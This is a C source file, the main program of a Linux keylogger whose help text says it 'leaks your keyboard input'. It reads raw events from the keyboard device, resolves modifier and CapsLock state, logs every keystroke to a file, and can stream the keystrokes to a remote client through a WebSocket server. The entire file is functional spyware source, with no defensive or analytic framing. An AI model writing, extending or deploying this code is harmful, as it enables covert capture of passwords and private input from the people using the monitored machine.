#include <fcntl.h>
#include <getopt.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "behavior_subject.h"
#include "keylogger.h"

#ifdef USE_LIBWEBSOCKETS
#include "websocket.h"
#endif

static volatile sig_atomic_t keep_running = true;
static bool printk_active = false;

void notify_key(const char *key) {
    if (!key || strcmp(key, "SKIP") == 0) return;
    if (printk_active) printf("%s\n", key);
#ifdef USE_LIBWEBSOCKETS
    send_message_to_client(key);
#endif
}

void print_help() {
    printf("\n");
    printf("Keylogger for Linux. Leaks your keyboard input\n");
    printf("\n");
    printf("Usage   : keylogger <options?>\n");
    printf("Options :\n");
    printf("  --dev <path>     Specify the device event to use\n");
    printf("  --no-log         Disable writing key to the log file\n");
    printf("  --printk         Show keystrokes in terminal\n");
    printf("  --port <uint16>  Specify websocket port\n");
    printf("\n");
    printf("  -h, --help       Display help message\n");
    printf("\n");
}

void signal_handler(int sig) {
    (void)sig;
    keep_running = false;
}

int main(int argc, char *argv[]) {
    bool with_log = true;
    const char *target_device_name = NULL;
#ifdef USE_LIBWEBSOCKETS
    uint16_t port = DEFAULT_PORT_WS;
#endif

    struct option keylogger_options[] = {
        {"dev",    required_argument, NULL, 0  },
#ifdef USE_LIBWEBSOCKETS
        {"port",   required_argument, NULL, 0  },
#endif
        {"no-log", no_argument,       NULL, 0  },
        {"printk", no_argument,       NULL, 0  },
        {"help",   no_argument,       NULL, 'h'},
        {0,        0,                 0,    0  }
    };

    int opt;
    int opt_index = 0;
    while ((opt = getopt_long(argc, argv, "h", keylogger_options, &opt_index)) != -1) {
        switch (opt) {
            case 'h':
                print_help();
                return EXIT_SUCCESS;
            case 0:
                if (opt_index == 0) target_device_name = optarg;
#ifdef USE_LIBWEBSOCKETS
                if (opt_index == 1) port = (uint16_t)strtoul(optarg, NULL, 10);
                if (opt_index == 2) with_log = false;
                if (opt_index == 3) printk_active = true;
#else
                if (opt_index == 1) with_log = false;
                if (opt_index == 2) printk_active = true;
#endif
                break;
            case '?':
                fprintf(stderr, "Unknown option. Use -h or --help for help\n");
                return EXIT_FAILURE;
            default:
                fprintf(stderr, "Failed to parse options\n");
                return EXIT_FAILURE;
        }
    }

    char *keyboard_path = find_keyboard_device(target_device_name);
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found");
        if (target_device_name) {
            fprintf(stderr, " with name: %s\n", target_device_name);
        } else {
            fprintf(stderr, " - check permissions or specify device explicitly\n");
        }
        return EXIT_FAILURE;
    }

    char *keyboard_name = get_keyboard_name(keyboard_path);
    if (keyboard_name) {
        printf("Using keyboard device: %s\n", keyboard_name);
    } else {
        printf("Using keyboard device: %s\n", keyboard_path);
    }

    FILE *file = with_log ? fopen(LOG_FILE, "w") : NULL;
    if (with_log && !file) {
        perror("Cannot open log file");
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open keyboard device");
        if (with_log) fclose(file);
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }

    bool state_capslock_active = false;
    unsigned char led_status_bytes[(LED_MAX / 8) + 1] = {0};
    if (ioctl(fd, EVIOCGLED(sizeof(led_status_bytes)), led_status_bytes) == -1) {
        fprintf(stderr, "Failed to get CapsLock LED status\n");
    } else {
        const int byte_index = LED_CAPSL / 8;
        const int bit_shift = LED_CAPSL % 8;
        state_capslock_active = (led_status_bytes[byte_index] & (1 << bit_shift)) != 0;
    }

    struct input_event event = {0};
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = state_capslock_active;

    BehaviorSubject subject;
    init_behavior_subject(&subject, "SKIP");
    subscribe(&subject, notify_key);

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

#ifdef USE_LIBWEBSOCKETS
    printf("Websocket listening on port: %d\n", port);
    printf(">>> You must set up a WebSocket client first for the keylogger to function properly.\n");
    if (init_websocket_server(port) != 0) {
        unsubscribe(&subject);
        close(fd);
        if (with_log) fclose(file);
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }
#endif

    char state_key_name[MAX_KEY_LEN] = {0};
    while (keep_running) {
#ifdef USE_LIBWEBSOCKETS
        lws_service(context, 0);
#endif
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                switch (event.code) {
                    case KEY_LEFTSHIFT:
                    case KEY_RIGHTSHIFT:
                        shift_pressed = event.value;
                        break;
                    case KEY_LEFTCTRL:
                    case KEY_RIGHTCTRL:
                        ctrl_pressed = event.value;
                        break;
                    case KEY_LEFTMETA:
                    case KEY_RIGHTMETA:
                        meta_pressed = event.value;
                        break;
                    case KEY_LEFTALT:
                    case KEY_RIGHTALT:
                        alt_pressed = event.value;
                        break;
                }

                if (event.value == 1) {
                    if (event.code == KEY_CAPSLOCK) {
                        state_capslock_active = !state_capslock_active;
                        capslock_active = state_capslock_active;
                        memcpy(state_key_name, "CapsLock", 9);
                        log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                    } else {
                        state_key_name[0] = '\0';
                        switch (event.code) {
                            case KEY_LEFTSHIFT:
                            case KEY_RIGHTSHIFT:
                                capslock_active = false;
                                memcpy(state_key_name, "Shift", 6);
                                break;
                            case KEY_LEFTCTRL:
                            case KEY_RIGHTCTRL:
                                memcpy(state_key_name, "Ctrl", 5);
                                break;
                            case KEY_LEFTMETA:
                            case KEY_RIGHTMETA:
                                memcpy(state_key_name, "Meta", 5);
                                break;
                            case KEY_LEFTALT:
                            case KEY_RIGHTALT:
                                memcpy(state_key_name, "Alt", 4);
                                break;
                            default:
                                if (state_capslock_active) {
                                    capslock_active = state_capslock_active;
                                }
                                break;
                        }

                        if (state_key_name[0] != '\0') {
                            log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                        }

                        const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                        if (strcmp(key_name, "UNKNOWN") != 0) {
                            if (state_key_name[0] != '\0') {
                                char combined[MAX_KEY_LEN] = {0};
                                size_t state_len = strlen(state_key_name);
                                size_t key_len = strlen(key_name);
                                if (state_len + key_len + 1 < MAX_KEY_LEN) {
                                    memcpy(combined, state_key_name, state_len);
                                    // Separator
                                    combined[state_len] = '+';
                                    memcpy(combined + state_len + 1, key_name, key_len + 1);
                                    log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, combined);
                                }
                            } else {
                                log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, key_name);
                            }
                        }
                    }
                }
            }
        } else if (bytes_read == -1) {
            break;
        }
    }

    unsubscribe(&subject);
    close(fd);
    if (with_log) fclose(file);
    free(keyboard_path);
    free(keyboard_name);

#ifdef USE_LIBWEBSOCKETS
    destroy_websocket_server();
#endif

    return EXIT_SUCCESS;
}
